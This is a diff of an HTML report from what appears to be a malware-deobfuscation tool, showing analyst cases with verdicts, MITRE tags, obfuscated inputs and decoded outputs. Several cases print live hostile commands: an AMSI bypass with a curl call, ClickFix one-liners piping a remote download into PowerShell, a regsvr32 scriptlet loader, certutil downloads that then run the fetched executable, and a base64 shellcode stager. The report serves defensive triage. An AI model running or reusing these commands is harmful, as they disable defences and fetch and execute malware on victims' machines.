@@ -1,25 +1,21 @@
-<!DOCTYPE html><html><head><meta charset="UTF-8"><title>NivXRay · Workspace Cases</title>
+<!DOCTYPE html><html><head><meta charset="UTF-8"><title>NivXRay · v1.3.5</title>
 <style>body{font-family:-apple-system,Segoe UI,sans-serif;background:#0a0e12;color:#e8ecf1;margin:0;padding:24px;max-width:1400px;margin:0 auto}
 h1{color:#7ee3c9;font-size:22px;border-bottom:2px solid #7ee3c9;padding-bottom:8px}
 .case{background:#12181f;border:1px solid #22303f;border-left:4px solid #6b7280;border-radius:6px;padding:16px;margin:16px 0}
-.case.malicious{border-left-color:#ef4444}.case.suspicious{border-left-color:#f59e0b}.case.corrupted{border-left-color:#a855f7}
+.case.malicious{border-left-color:#ef4444}.case.suspicious{border-left-color:#f59e0b}.case.corrupted{border-left-color:#a855f7}.case.undecoded{border-left-color:#6b7280}
 .name{font-weight:700;font-size:15px;color:#fafafa}
 .badge{display:inline-block;padding:3px 8px;border-radius:3px;font-family:JetBrains Mono,monospace;font-size:10px;letter-spacing:.06em;margin-right:4px;margin-bottom:3px}
 .b-mal{background:#ef444422;color:#fca5a5;border:1px solid #ef4444}.b-sus{background:#f59e0b22;color:#fcd34d;border:1px solid #f59e0b}
 .b-cor{background:#a855f722;color:#e9d5ff;border:1px solid #a855f7}.b-unk{background:#6b728022;color:#d1d5db;border:1px solid #6b7280}
 .mitre{background:#a855f722;color:#e9d5ff;border:1px solid #a855f7}.lol{background:#f59e0b22;color:#fcd34d;border:1px solid #f59e0b}
-.chain{background:#7ee3c922;color:#7ee3c9;border:1px solid #7ee3c9}
+.chain{background:#7ee3c922;color:#7ee3c9;border:1px solid #7ee3c9}.pp{background:#0d5460;color:#7ee3c9;border:1px solid #7ee3c9;padding:2px 6px;font-size:10px;border-radius:3px;margin-right:4px}
 .section{margin:8px 0;font-size:12px}.section-title{color:#9ca3af;font-size:11px;text-transform:uppercase;letter-spacing:.08em;margin-bottom:4px}
 pre{background:#0a0e12;border:1px solid #22303f;padding:10px;border-radius:4px;font-size:11px;line-height:1.5;overflow-x:auto;white-space:pre-wrap;word-break:break-all;font-family:JetBrains Mono,monospace}
 .stat{color:#7ee3c9;font-family:JetBrains Mono,monospace}</style></head><body>
-<h1>NivXRay · Workspace Cases · v1.3.4 Full Re-Decode</h1>
-<p>Every saved case (real analyst payloads) re-run through the current pipeline.<br>
-<strong>17 cases</strong> · Sat Jul 18 13:27:50 UTC 2026</p>
-<p class="stat">Verdict split: <strong>8 Malicious · 5 Suspicious · 2 Corrupted</strong></p>
+<h1>NivXRay · Workspace Cases · v1.3.5</h1><p>Sat Jul 18 13:46:07 UTC 2026</p>
+<p class="stat">Verdicts: <strong>7 Malicious · 6 Suspicious · 2 Corrupted · 2 Undecoded</strong> · 17 cases</p>
 <div class="case malicious"><div class="name">#1 · Check the Output_is it a correct or still need further decoding?</div>
-<div style="margin:8px 0"><span class="badge b-mal">MALICIOUS · score 100</span>
-<span class="badge chain">archetype:PS_EncodedCommand+PS_STRING_CONCAT+PS_FORMAT_OPERA</span>
-<span class="badge chain">2442 chars</span></div>
+<div style="margin:8px 0"><span class="badge b-mal">MALICIOUS · score 100</span><span class="badge chain">archetype:PS_EncodedCommand+PS_STRING_CONCAT+PS_FORMAT_OPERATOR+archet</span><span class="badge chain">2442 chars</span></div>
 <div class="section"><span class="section-title">Chain (10 steps)</span><br>
 <span class="badge chain">extract-b64</span>
 <span class="badge chain">utf16le-or-utf8-decode</span>
@@ -32,7 +28,7 @@ pre{background:#0a0e12;border:1px solid #22303f;padding:10px;border-radius:4px;f
 <span class="badge chain">ps-format-op</span>
 <span class="badge chain">ps-format-op</span>
 </div>
-<div class="section"><span class="section-title">MITRE ATT&CK (6)</span><br>
+<div class="section"><span class="section-title">MITRE ATT&amp;CK (6)</span><br>
 <span class="badge mitre">T1059.001</span>
 <span class="badge mitre">T1027.010</span>
 <span class="badge mitre">T1059.003</span>
@@ -46,18 +42,16 @@ pre{background:#0a0e12;border:1px solid #22303f;padding:10px;border-radius:4px;f
 </div>
 <div class="section"><span class="section-title">IOCs</span><br><span class="stat">urls=1 · ips=1</span></div>
 <div class="section"><span class="section-title">Input (first 400 chars)</span><pre>/Q /c powershell.exe -noni -nop -w 1 -enc UwBgAGUAVAAtAEkAdABgAGUAbQAgACgAIAAnAFYAJwArACcAYQBSACcAIAArACAAIAAnAEkAQQAnACAAKwAgACgAKAAiAHsAMQB9AHsAMAB9ACIALQBmACcAMQAnACwAJwBiAGwARQA6ACcAKQArACcAcQAyACcAKQAgACAAKwAgACgAJwB1AFoAJwArACcAeAAnACkAIAAgACkAIAAoACAAWwBUAFkAcABFAF0AKAAgACAAIgB7ADEAfQB7ADAAfQAiAC0ARgAnAEYAJwAsACcAcgBFACcAIAAgACkAIAApACAAIAA7ACAAIAAgACAAKAAgACAAIAAgAEcAZQB0AC0AdgBhAHIASQBgAE …</pre></div>
-<div class="section"><span class="section-title">Decoded Output (first 800 chars)</span><pre>SeT-Item ( VaRIA + ((blE:1)+&#x27;q2&#x27;)  + &#x27;uZx&#x27;  ) ( [TYpE]&#x27;rEF&#x27; )  ;    (    Get-varIABLE  &#x27;1Q2UzX&#x27;  -VaL  ).&quot;AssEmbly&quot;.&quot;GETTYPe&quot;&#x27;System.Management.Automation.AmsiUtils&#x27;.&quot;getfiElD&quot;(  &#x27;amsiInitFailed&#x27;,&#x27;NonPublic,Static&#x27;).&quot;sETVaLUE&quot;(  ${nULl},${tRuE} ) curl.exe https://10.2.27.30</pre></div></div>
+<div class="section"><span class="section-title">Decoded Output (first 1200 chars)</span><pre>SeT-Item ( VaRIA + ((blE:1)+&#x27;q2&#x27;)  + &#x27;uZx&#x27;  ) ( [TYpE]&#x27;rEF&#x27; )  ;    (    Get-varIABLE  &#x27;1Q2UzX&#x27;  -VaL  ).&quot;AssEmbly&quot;.&quot;GETTYPe&quot;&#x27;System.Management.Automation.AmsiUtils&#x27;.&quot;getfiElD&quot;(  &#x27;amsiInitFailed&#x27;,&#x27;NonPublic,Static&#x27;).&quot;sETVaLUE&quot;(  ${nULl},${tRuE} ) curl.exe https://10.2.27.30</pre></div></div>
 <div class="case malicious"><div class="name">#2 · ClickFix</div>
-<div style="margin:8px 0"><span class="badge b-mal">MALICIOUS · score 100</span>
-<span class="badge chain">archetype:CMD_DELAYED_EXPANSION_CARET+LOLBAS_REGSVR32_SCRIPT</span>
-<span class="badge chain">1336 chars</span></div>
+<div style="margin:8px 0"><span class="badge b-mal">MALICIOUS · score 100</span><span class="badge chain">archetype:CMD_DELAYED_EXPANSION_CARET+LOLBAS_REGSVR32_SCRIPTLET</span><span class="badge chain">1336 chars</span></div>
 <div class="section"><span class="section-title">Chain (4 steps)</span><br>
 <span class="badge chain">strip-carets</span>
 <span class="badge chain">cmd-set-collect</span>
 <span class="badge chain">expand-bang-var</span>
 <span class="badge chain">regsvr32-annotate</span>
 </div>
-<div class="section"><span class="section-title">MITRE ATT&CK (4)</span><br>
+<div class="section"><span class="section-title">MITRE ATT&amp;CK (4)</span><br>
 <span class="badge mitre">T1059.003</span>
 <span class="badge mitre">T1218.010</span>
 <span class="badge mitre">T1583.001</span>
@@ -72,22 +66,23 @@ pre{background:#0a0e12;border:1px solid #22303f;padding:10px;border-radius:4px;f
 <div class="section"><span class="section-title">IOCs</span><br><span class="stat">urls=1 · domains=2</span></div>
 <div class="section"><span class="section-title">Input (first 400 chars)</span><pre>C:\\Windows\\system32\\cmd.exe /c start  /min cmd /v:on /k echo off&amp;set q8k3=where c*d.e?e&amp;set r5m9=where c*u*r*l.e?e&amp;set t2x7=where p*ell.exe&amp;for /f %i in (&#x27;!q8k3!&#x27;)do %i /c for /f %k in (&#x27;!r5m9!&#x27;)do %k h^t^t^p^s^:^/^/^t^o^m^m^y^-^a^a^.^l^o^l^/f^|for /f %j in (&#x27;!t2x7!&#x27;)do %j cmd&quot;,
 cmd.exe /c start /min cmd /v:on /k echo off &amp; for /f %k in (&#x27;where curl.exe&#x27;) do %k https://tommy-aa.lol/f | powershe …</pre></div>
-<div class="section"><span class="section-title">Decoded Output (first 800 chars)</span><pre># --- Regsvr32 Scriptlet Loader Detected (Squiblydoo) ---
+<div class="section"><span class="section-title">Decoded Output (first 1200 chars)</span><pre># --- Regsvr32 Scriptlet Loader Detected (Squiblydoo) ---
 # T1218.010 · Signed Binary Proxy Execution: Regsvr32
 # Scriptlet URL: https://tommy-aa.lol/f|for
 C:\\Windows\\system32\\cmd.exe /c start  /min cmd /v:on /k echo off&amp;set q8k3=where c*d.e?e&amp;set r5m9=where c*u*r*l.e?e&amp;set t2x7=where p*ell.exe&amp;for /f %i in (&#x27;where cmd.exe &#x27;)do %i /c for /f %k in (&#x27;where curl.exe &#x27;)do %k https://tommy-aa.lol/f|for /f %j in (&#x27;where powershell.exe &#x27;)do %j cmd&quot;,
 cmd.exe /c start /min cmd /v:on /k echo off &amp; for /f %k in (&#x27;where curl.exe&#x27;) do %k https://tommy-aa.lol/f | powershell.exe cmd
-md /v:on /k echo off&amp;set q8k3=where c*d.e?e&amp;set r5m9=where c*u*r*l.e?e&amp;set t2x7=where p*ell.exe&amp;for /f %i in (&#x27;where cmd.exe &#x27;)do %i /c for /f %k in (&#x27;where curl.exe &#x27;)do %k https://tommy-aa.lol/f|for /f %j in (&#x27;where powe …</pre></div></div>
+md /v:on /k echo off&amp;set q8k3=where c*d.e?e&amp;set r5m9=where c*u*r*l.e?e&amp;set t2x7=where p*ell.exe&amp;for /f %i in (&#x27;where cmd.exe &#x27;)do %i /c for /f %k in (&#x27;where curl.exe &#x27;)do %k https://tommy-aa.lol/f|for /f %j in (&#x27;where powershell.exe &#x27;)do %j cmd
+md.exe /c start /min cmd /v:on /k echo off &amp; set q8k3=where cmd.exe &amp; set r5m9=where curl.exe &amp; set t2x7=where powershell.exe &amp; for /f %i in (&#x27;where cmd.exe&#x27;) do %i /c for /f %k in (&#x27;where curl.exe&#x27;) do %k https://tommy-aa.lol/f | for /f %j in (&#x27;where powershell.exe&#x27;) do %j cmd
+md.exe /c echo regsvr32.exe /s /u /i:{REMOTEURL:.sct} scrobj.dll &gt; {PATH}:payload.bat
+cmd.exe - &lt;  …</pre></div></div>
 <div class="case malicious"><div class="name">#3 · ClickFix</div>
-<div style="margin:8px 0"><span class="badge b-mal">MALICIOUS · score 100</span>
-<span class="badge chain">archetype:CMD_DELAYED_EXPANSION_CARET</span>
-<span class="badge chain">282 chars</span></div>
+<div style="margin:8px 0"><span class="badge b-mal">MALICIOUS · score 100</span><span class="badge chain">archetype:CMD_DELAYED_EXPANSION_CARET</span><span class="badge chain">282 chars</span></div>
 <div class="section"><span class="section-title">Chain (3 steps)</span><br>
 <span class="badge chain">strip-carets</span>
 <span class="badge chain">cmd-set-collect</span>
 <span class="badge chain">expand-bang-var</span>
 </div>
-<div class="section"><span class="section-title">MITRE ATT&CK (3)</span><br>
+<div class="section"><span class="section-title">MITRE ATT&amp;CK (3)</span><br>
 <span class="badge mitre">T1059.003</span>
 <span class="badge mitre">T1583.001</span>
 <span class="badge mitre">T1027</span>
@@ -97,17 +92,15 @@ md /v:on /k echo off&amp;set q8k3=where c*d.e?e&amp;set r5m9=where c*u*r*l.e?e&a
 </div>
 <div class="section"><span class="section-title">IOCs</span><br><span class="stat">urls=1 · domains=1</span></div>
 <div class="section"><span class="section-title">Input (first 400 chars)</span><pre>C:\\Windows\\system32\\cmd.exe /c start  /min cmd /v:on /k echo off&amp;set q8k3=where c*d.e?e&amp;set r5m9=where c*u*r*l.e?e&amp;set t2x7=where p*ell.exe&amp;for /f %i in (&#x27;!q8k3!&#x27;)do %i /c for /f %k in (&#x27;!r5m9!&#x27;)do %k h^t^t^p^s^:^/^/^t^o^m^m^y^-^a^a^.^l^o^l^/f^|for /f %j in (&#x27;!t2x7!&#x27;)do %j cmd&quot;,</pre></div>
-<div class="section"><span class="section-title">Decoded Output (first 800 chars)</span><pre>C:\\Windows\\system32\\cmd.exe /c start  /min cmd /v:on /k echo off&amp;set q8k3=where c*d.e?e&amp;set r5m9=where c*u*r*l.e?e&amp;set t2x7=where p*ell.exe&amp;for /f %i in (&#x27;where c*d.e?e&#x27;)do %i /c for /f %k in (&#x27;where c*u*r*l.e?e&#x27;)do %k https://tommy-aa.lol/f|for /f %j in (&#x27;where p*ell.exe&#x27;)do %j cmd&quot;,</pre></div></div>
+<div class="section"><span class="section-title">Decoded Output (first 1200 chars)</span><pre>C:\\Windows\\system32\\cmd.exe /c start  /min cmd /v:on /k echo off&amp;set q8k3=where c*d.e?e&amp;set r5m9=where c*u*r*l.e?e&amp;set t2x7=where p*ell.exe&amp;for /f %i in (&#x27;where c*d.e?e&#x27;)do %i /c for /f %k in (&#x27;where c*u*r*l.e?e&#x27;)do %k https://tommy-aa.lol/f|for /f %j in (&#x27;where p*ell.exe&#x27;)do %j cmd&quot;,</pre></div></div>
 <div class="case malicious"><div class="name">#4 · NEW_Alert</div>
-<div style="margin:8px 0"><span class="badge b-mal">MALICIOUS · score 100</span>
-<span class="badge chain">archetype:WINDOWS_DEFENSE_EVASION_BEHAVIOR_PATTERN</span>
-<span class="badge chain">24068 chars</span></div>
+<div style="margin:8px 0"><span class="badge b-mal">MALICIOUS · score 100</span><span class="badge chain">archetype:WINDOWS_DEFENSE_EVASION_BEHAVIOR_PATTERN</span><span class="badge chain">24068 chars</span></div>
 <div class="section"><span class="section-title">Chain (3 steps)</span><br>
 <span class="badge chain">behavior-pattern-detect</span>
 <span class="badge chain">mitre-annotate</span>
 <span class="badge chain">verdict-override-high</span>
 </div>
-<div class="section"><span class="section-title">MITRE ATT&CK (3)</span><br>
+<div class="section"><span class="section-title">MITRE ATT&amp;CK (3)</span><br>
 <span class="badge mitre">T1059.001</span>
 <span class="badge mitre">T1057</span>
 <span class="badge mitre">T1082</span>
@@ -127,7 +120,7 @@ md /v:on /k echo off&amp;set q8k3=where c*d.e?e&amp;set r5m9=where c*u*r*l.e?e&a
 
 \f0\fs24 \cf0 \expnd0\expndtw0\kerning0
 \outl0\strokewidth0 \st …</pre></div>
-<div class="section"><span class="section-title">Decoded Output (first 800 chars)</span><pre># --- Windows Defense-Evasion Behavior Pattern Detected ---
+<div class="section"><span class="section-title">Decoded Output (first 1200 chars)</span><pre># --- Windows Defense-Evasion Behavior Pattern Detected ---
 # Severity: HIGH · Confidence: 93%
 # WorkBuddy/CodeBuddy weaponisation profile matched (Tencent AI-coding CLI)
 
@@ -150,11 +143,17 @@ md /v:on /k echo off&amp;set q8k3=where c*d.e?e&amp;set r5m9=where c*u*r*l.e?e&a
   HIGH — concurrent defense-evasion + credential-access + security-software-discovery
   patterns constitute an active adversary post-exploitation stage.
 
-## Original Scrip …</pre></div></div>
+## Original Script (unmodified)
+────────────────────────────────────────────────────────────
+{\rtf1\ansi\ansicpg1252\cocoartf2870
+\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\froman\fcharset0 Times-Roman;}
+{\colortbl;\red255\green255\blue255;\red0\green0\blue0;}
+{\*\expandedcolortbl;;\cssrgb\c0\c0\c0;}
+\paperw11900\paperh16840\margl1440\margr1440\vieww11520\viewh8400\viewkind0
+\deftab720
+\pard\pardeftab720\partig …</pre></div></div>
 <div class="case malicious"><div class="name">#5 · New1</div>
-<div style="margin:8px 0"><span class="badge b-mal">MALICIOUS · score 100</span>
-<span class="badge chain">archetype:PS_EncodedCommand+PS_HEXFAMILY_UNIFIED_OBFUSCATION</span>
-<span class="badge chain">1130 chars</span></div>
+<div style="margin:8px 0"><span class="badge b-mal">MALICIOUS · score 100</span><span class="badge chain">archetype:PS_EncodedCommand+PS_HEXFAMILY_UNIFIED_OBFUSCATION+CERTUTIL_</span><span class="badge chain">1130 chars</span></div>
 <div class="section"><span class="section-title">Chain (8 steps)</span><br>
 <span class="badge chain">extract-b64</span>
 <span class="badge chain">utf16le-or-utf8-decode</span>
@@ -165,7 +164,7 @@ md /v:on /k echo off&amp;set q8k3=where c*d.e?e&amp;set r5m9=where c*u*r*l.e?e&a
 <span class="badge chain">utf16le-or-utf8-decode</span>
 <span class="badge chain">certutil-annotate</span>
 </div>
-<div class="section"><span class="section-title">MITRE ATT&CK (5)</span><br>
+<div class="section"><span class="section-title">MITRE ATT&amp;CK (5)</span><br>
 <span class="badge mitre">T1059.001</span>
 <span class="badge mitre">T1027.010</span>
 <span class="badge mitre">T1059.003</span>
@@ -179,13 +178,11 @@ md /v:on /k echo off&amp;set q8k3=where c*d.e?e&amp;set r5m9=where c*u*r*l.e?e&a
 </div>
 <div class="section"><span class="section-title">IOCs</span><br><span class="stat">urls=1 · domains=2</span></div>
 <div class="section"><span class="section-title">Input (first 400 chars)</span><pre>powershell.exe -e ZDN4XGQzeFw3NnhcZDR4XDk3eFw1NXhcMzV4XGE1eFw0M3hcNjV4XGQ2eFxjNHhcYzZ4XGE0eFw4NXhcOTV4XDMzeFw4N3hcNzV4XDk1eFw0N3hcZTR4XDU1eFxlNHhcYzZ4XDU1eFxhNnhcZDR4XGM2eFwxNHhcNjV4XDQ1eFw2NHhcMjV4XDY1eFxlNHhcOTd4XDU1eFwzNHhcZDR4XDk3eFw1NXhcOTZ4XGU0eFw5N3hcNTV4XDk2eFxlNHhcOTd4XDU1eFwzNHhcZDR4XDk3eFw1NXhcMzV4XGE1eFw0M3hcNjV4XGQ2eFxjNHhcYzZ4XGE0eFw4NXhcOTV4XDMzeFw4N3hcNzV4XDk1eFw0N3hcZTR4XDU1eFxlNH …</pre></div>
-<div class="section"><span class="section-title">Decoded Output (first 800 chars)</span><pre># --- Certutil LOLBAS Workflow Detected ---
+<div class="section"><span class="section-title">Decoded Output (first 1200 chars)</span><pre># --- Certutil LOLBAS Workflow Detected ---
 # T1105 · Ingress Tool Transfer (certutil -urlcache)
 cmd.exe /c &quot;certutil.exe -urlcache -split -f http://evil.xyz+X[�\�K�^IL�	L�UST	L�IMP�X[�\�K�^IL�	L��L��L�	L�UST	L�IMP�X[�\�K�^IL</pre></div></div>
 <div class="case malicious"><div class="name">#6 · Error1</div>
-<div style="margin:8px 0"><span class="badge b-mal">MALICIOUS · score 100</span>
-<span class="badge chain">archetype:PS_EncodedCommand+PS_HEXFAMILY_UNIFIED_OBFUSCATION</span>
-<span class="badge chain">1130 chars</span></div>
+<div style="margin:8px 0"><span class="badge b-mal">MALICIOUS · score 100</span><span class="badge chain">archetype:PS_EncodedCommand+PS_HEXFAMILY_UNIFIED_OBFUSCATION+CERTUTIL_</span><span class="badge chain">1130 chars</span></div>
 <div class="section"><span class="section-title">Chain (8 steps)</span><br>
 <span class="badge chain">extract-b64</span>
 <span class="badge chain">utf16le-or-utf8-decode</span>
@@ -196,7 +193,7 @@ cmd.exe /c &quot;certutil.exe -urlcache -split -f http://evil.xyz+X[�\�K�
 <span class="badge chain">utf16le-or-utf8-decode</span>
 <span class="badge chain">certutil-annotate</span>
 </div>
-<div class="section"><span class="section-title">MITRE ATT&CK (5)</span><br>
+<div class="section"><span class="section-title">MITRE ATT&amp;CK (5)</span><br>
 <span class="badge mitre">T1059.001</span>
 <span class="badge mitre">T1027.010</span>
 <span class="badge mitre">T1059.003</span>
@@ -210,36 +207,16 @@ cmd.exe /c &quot;certutil.exe -urlcache -split -f http://evil.xyz+X[�\�K�
 </div>
 <div class="section"><span class="section-title">IOCs</span><br><span class="stat">urls=1 · domains=2</span></div>
 <div class="section"><span class="section-title">Input (first 400 chars)</span><pre>powershell.exe -e ZDN4XGQzeFw3NnhcZDR4XDk3eFw1NXhcMzV4XGE1eFw0M3hcNjV4XGQ2eFxjNHhcYzZ4XGE0eFw4NXhcOTV4XDMzeFw4N3hcNzV4XDk1eFw0N3hcZTR4XDU1eFxlNHhcYzZ4XDU1eFxhNnhcZDR4XGM2eFwxNHhcNjV4XDQ1eFw2NHhcMjV4XDY1eFxlNHhcOTd4XDU1eFwzNHhcZDR4XDk3eFw1NXhcOTZ4XGU0eFw5N3hcNTV4XDk2eFxlNHhcOTd4XDU1eFwzNHhcZDR4XDk3eFw1NXhcMzV4XGE1eFw0M3hcNjV4XGQ2eFxjNHhcYzZ4XGE0eFw4NXhcOTV4XDMzeFw4N3hcNzV4XDk1eFw0N3hcZTR4XDU1eFxlNH …</pre></div>
-<div class="section"><span class="section-title">Decoded Output (first 800 chars)</span><pre># --- Certutil LOLBAS Workflow Detected ---
+<div class="section"><span class="section-title">Decoded Output (first 1200 chars)</span><pre># --- Certutil LOLBAS Workflow Detected ---
 # T1105 · Ingress Tool Transfer (certutil -urlcache)
 cmd.exe /c &quot;certutil.exe -urlcache -split -f http://evil.xyz+X[�\�K�^IL�	L�UST	L�IMP�X[�\�K�^IL�	L��L��L�	L�UST	L�IMP�X[�\�K�^IL</pre></div></div>
-<div class="case malicious"><div class="name">#7 · Need_Evaluation on OUTPUT</div>
-<div style="margin:8px 0"><span class="badge b-mal">MALICIOUS · score 98</span>
-<span class="badge chain">magic</span>
-<span class="badge chain">1170 chars</span></div>
-<div class="section"><span class="section-title">Chain (3 steps)</span><br>
-<span class="badge chain">extract-payload</span>
-<span class="badge chain">base64-decode</span>
-<span class="badge chain">xor-brute</span>
-</div>
-<div class="section"><span class="section-title">MITRE ATT&CK (4)</span><br>
-<span class="badge mitre">T1140</span>
-<span class="badge mitre">T1027</span>
-<span class="badge mitre">T1055</span>
-<span class="badge mitre">T1620</span>
-</div>
-<div class="section"><span class="section-title">Input (first 400 chars)</span><pre>[Byte[]]$var_code = [System.Convert]::FromBase64String(&#x27;38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2yyMjIyMS3HR0dHR0Sxl1WoTc9sqHIyMjeBLqcnJJIHJyS5giIyNwc0t0qrzl3PZzyq8jIyN4EvFxSyMR46dxcXFwcXNLyHYNGNz2quWg4HNLoxAjI6rDSSdzSTx1S1Zl …</pre></div>
-<div class="section"><span class="section-title">Decoded Output (first 800 chars)</span><pre>üè   `å1ÒdR0RRr(·J&amp;1ÿ1À¬&lt;a|, ÁÏÇâðRWRB&lt;Ð@xÀtJÐPHX Óã&lt;I4Ö1ÿ1À¬ÁÏÇ8àuô}ø;}$uâXX$ÓfKXÓÐD$$[[aYZQÿàX_Zë]hnet hwiniThLw&amp;ÿÕè    1ÿWWWWWh:Vy§ÿÕé¤   [1ÉQQjQQh»  SPhWÆÿÕPé   [1ÒRh 2ÀRRRSRPhëU.;ÿÕÆÃPh3  àjPjVhuFÿÕ_1ÿWWjÿSVh-{ÿÕÀÊ  1ÿötùë	hªÅâ]ÿÕÁhE!^1ÿÕ1ÿWjQVPh·WàÿÕ¿ /  9ÇuXPé{ÿÿÿ1ÿé  éÉ  èoÿÿÿ/EZWf koW«&#x27;±´ Úä´{­ö¥Úx¡ÉJ½¢ÛõÛ@PU³nö4rÝ¼ÅsÍLT&lt;î|¹j\÷ÚzÉFdç User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;PTBR)
- Ûu¸¦kò;fÇðÙhú dÌôÌFÊXù^º%Ð¢Iº8¾cð$t§ö¬.iì8dùõzê9];i¶7­AaZ&gt;ÂÉ¶ö¢Tu%1XéE£â K(Ã×¦âäêæÇÍëÞ¦Ä(÷*nLÊ`§ÖÃtÇ,&gt;®è;5û&gt;:Q¯9g|=ép]ºNÀEºÂWZí»Ö(ÇAouö±§PßÕFºØtèhY%0WOÉ3xÅShgùß}PA hðµ¢VÿÕj@h   h  @ WhX¤SåÿÕ¹    ÙQSçWh    SVhâÿÕÀ …</pre></div></div>
-<div class="case malicious"><div class="name">#8 · Real_Confirmed_Authorized Activity</div>
-<div style="margin:8px 0"><span class="badge b-mal">MALICIOUS · score 82</span>
-<span class="badge chain">archetype:CERTUTIL_DOWNLOAD_DECODE_WORKFLOW+smart</span>
-<span class="badge chain">363 chars</span></div>
+<div class="case malicious"><div class="name">#7 · Real_Confirmed_Authorized Activity</div>
+<div style="margin:8px 0"><span class="badge b-mal">MALICIOUS · score 82</span><span class="badge chain">archetype:CERTUTIL_DOWNLOAD_DECODE_WORKFLOW+smart</span><span class="badge chain">363 chars</span></div>
 <div class="section"><span class="section-title">Chain (2 steps)</span><br>
 <span class="badge chain">certutil-annotate</span>
 <span class="badge chain">env-expand</span>
 </div>
-<div class="section"><span class="section-title">MITRE ATT&CK (3)</span><br>
+<div class="section"><span class="section-title">MITRE ATT&amp;CK (3)</span><br>
 <span class="badge mitre">T1105</span>
 <span class="badge mitre">T1059.003</span>
 <span class="badge mitre">T1074.001</span>
@@ -249,13 +226,11 @@ cmd.exe /c &quot;certutil.exe -urlcache -split -f http://evil.xyz+X[�\�K�
 </div>
 <div class="section"><span class="section-title">IOCs</span><br><span class="stat">urls=1 · ips=1</span></div>
 <div class="section"><span class="section-title">Input (first 400 chars)</span><pre>urlcache -f http://10.200.49.6:8080/FR-X2XmSY2X4F0ivU4nTYw C:\Users\SP_APP~1\AppData\Local\Temp\BfBjkkJBdU.exe, /c certutil -urlcache -f http://10.200.49.6:8080/FR-X2XmSY2X4F0ivU4nTYw %TEMP%\BfBjkkJBdU.exe &amp; start /B %TEMP%\BfBjkkJBdU.exe, certutil -urlcache -f http://10.200.49.6:8080/FR-X2XmSY2X4F0ivU4nTYw %TEMP%\BfBjkkJBdU.exe &amp; start /B %TEMP%\BfBjkkJBdU.exe</pre></div>
-<div class="section"><span class="section-title">Decoded Output (first 800 chars)</span><pre># --- Certutil LOLBAS Workflow Detected ---
+<div class="section"><span class="section-title">Decoded Output (first 1200 chars)</span><pre># --- Certutil LOLBAS Workflow Detected ---
 # T1105 · Ingress Tool Transfer (certutil -urlcache)
 urlcache -f http://10.200.49.6:8080/FR-X2XmSY2X4F0ivU4nTYw C:\Users\SP_APP~1\AppData\Local\Temp\BfBjkkJBdU.exe, /c certutil -urlcache -f http://10.200.49.6:8080/FR-X2XmSY2X4F0ivU4nTYw C:\Users\Public\AppData\Local\Temp\BfBjkkJBdU.exe &amp; start /B C:\Users\Public\AppData\Local\Temp\BfBjkkJBdU.exe, certutil -urlcache -f http://10.200.49.6:8080/FR-X2XmSY2X4F0ivU4nTYw C:\Users\Public\AppData\Local\Temp\BfBjkkJBdU.exe &amp; start /B C:\Users\Public\AppData\Local\Temp\BfBjkkJBdU.exe</pre></div></div>
-<div class="case suspicious"><div class="name">#9 · Investigate</div>
-<div style="margin:8px 0"><span class="badge b-sus">SUSPICIOUS · score 100</span>
-<span class="badge chain">archetype:PS_EncodedCommand+PS_HEXFAMILY_UNIFIED_OBFUSCATION</span>
-<span class="badge chain">1384 chars</span></div>
+<div class="case suspicious"><div class="name">#8 · Investigate</div>
+<div style="margin:8px 0"><span class="badge b-sus">SUSPICIOUS · score 100</span><span class="badge chain">archetype:PS_EncodedCommand+PS_HEXFAMILY_UNIFIED_OBFUSCATION</span><span class="badge chain">1384 chars</span></div>
 <div class="section"><span class="section-title">Chain (7 steps)</span><br>
 <span class="badge chain">extract-b64</span>
 <span class="badge chain">utf16le-or-utf8-decode</span>
@@ -265,7 +240,7 @@ urlcache -f http://10.200.49.6:8080/FR-X2XmSY2X4F0ivU4nTYw C:\Users\SP_APP~1\App
 <span class="badge chain">base64-decode</span>
 <span class="badge chain">utf16le-or-utf8-decode</span>
 </div>
-<div class="section"><span class="section-title">MITRE ATT&CK (4)</span><br>
+<div class="section"><span class="section-title">MITRE ATT&amp;CK (4)</span><br>
 <span class="badge mitre">T1059.001</span>
 <span class="badge mitre">T1027.010</span>
 <span class="badge mitre">T1059.003</span>
@@ -276,11 +251,9 @@ urlcache -f http://10.200.49.6:8080/FR-X2XmSY2X4F0ivU4nTYw C:\Users\SP_APP~1\App
 <span class="badge lol">cmd.exe</span>
 </div>
 <div class="section"><span class="section-title">Input (first 400 chars)</span><pre>cmd.exe /q /c powershell.exe -e ZDN4XGQzeFw3NnhcZDR4XDk3eFw1NXhcMzV4XGE1eFw0M3hcNjV4XGQ2eFxjNHhcYzZ4XGE0eFw4NXhcOTV4XDMzeFw4N3hcNzV4XDk1eFw0N3hcZTR4XDU1eFxlNHhcYzZ4XDU1eFxhNnhcZDR4XGM2eFwxNHhcNjV4XDQ1eFw2NHhcMjV4XDY1eFxlNHhcOTd4XDU1eFwzNHhcZDR4XDk3eFw1NXhcOTZ4XGU0eFw5N3hcNTV4XDk2eFxlNHhcOTd4XDU1eFwzNHhcZDR4XDk3eFw1NXhcMzV4XGE1eFw0M3hcNjV4XGQ2eFxjNHhcYzZ4XGE0eFw4NXhcOTV4XDMzeFw4N3hcNzV4XDk1eFw0N3hc …</pre></div>
-<div class="section"><span class="section-title">Decoded Output (first 800 chars)</span><pre>==gMyUSZ4VmLlJXY3xWYtNUNlUjMlAVTFRVNyUCMyUiNyUiNyUCMyUSZ4VmLlJXY3xWYtNUNlUjMlAVTFRVNyUCMyUSZ4VmLlJXY3xWYtie5hnLslmdl9yLBNTJwRHdoBjMlYWLwITJ0lGbwNXLwITJlh2YhNGbyVXLwITJlhXZuwWa0VHdyV2YyITJwITJj9CMyUSZtFmTwITJ0NWZqJ2TtQ3YlxWZTBjMlM0NlAjMlM3gMyUSZ4VmLk12Y</pre></div></div>
-<div class="case suspicious"><div class="name">#10 · Error3</div>
-<div style="margin:8px 0"><span class="badge b-sus">SUSPICIOUS · score 100</span>
-<span class="badge chain">archetype:PS_EncodedCommand+PS_HEXFAMILY_UNIFIED_OBFUSCATION</span>
